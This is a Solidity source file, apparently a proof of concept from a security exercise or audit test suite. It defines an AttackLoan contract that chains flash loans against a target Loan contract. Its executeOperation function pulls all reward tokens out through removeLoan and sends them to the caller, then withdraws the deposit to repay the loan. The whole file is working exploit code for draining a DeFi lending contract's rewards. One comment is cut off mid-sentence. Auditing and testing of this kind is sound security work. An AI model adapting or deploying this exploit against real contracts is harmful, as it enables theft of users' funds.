// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/console.sol";

import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {Loan, IFlashLoanSimpleReceiver, IPoolAddressesProvider} from "../../src/flashloan/Loan.sol";
import {IPool} from "../../src/flashloan/IPool.sol";

// @note this contract is not used in the attack, not for users to 
contract AttackLoan is IFlashLoanSimpleReceiver {
    IPoolAddressesProvider public constant ADDRESSES_PROVIDER = 
        IPoolAddressesProvider(0x0496275d34753A48320CA58103d5220d394FF77F);
    IPool public immutable POOL;
    Loan public immutable loan;

    constructor(address _loan) {
        loan = Loan(_loan);
        POOL = IPool(ADDRESSES_PROVIDER.getPool());
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        require(msg.sender == address(POOL), "!pool");
        IERC20(asset).approve(address(POOL), amount + premium);

        console.log("Sending to loan contract");
        IERC20(asset).transfer(address(loan), amount + premium);

        console.log("Calling flash loan on loan contract");
        POOL.flashLoanSimple(address(loan), asset, amount, "", 0);

        // take all rewards
        console.log("Taking all rewards");
        console.log("Initator: %s", initiator);
        uint256 rewardBalance = IERC20(loan.rewardToken()).balanceOf(address(loan));
        loan.removeLoan(loan.rewardToken(), rewardBalance);
        console.log("Sending rewards to initiator: %d", rewardBalance);
        IERC20(loan.rewardToken()).transfer(initiator, rewardBalance);
        // withdraw send amount
        console.log("Withdraw asset from loan contract");
        loan.removeLoan(asset, amount);

        console.log("Should have enough to repay flash loan");
        require(IERC20(asset).balanceOf(address(this)) >= amount + premium, "!payout");
        // @note he funds will be automatically pulled at the conclusion of your operation.
        return true;
    }
}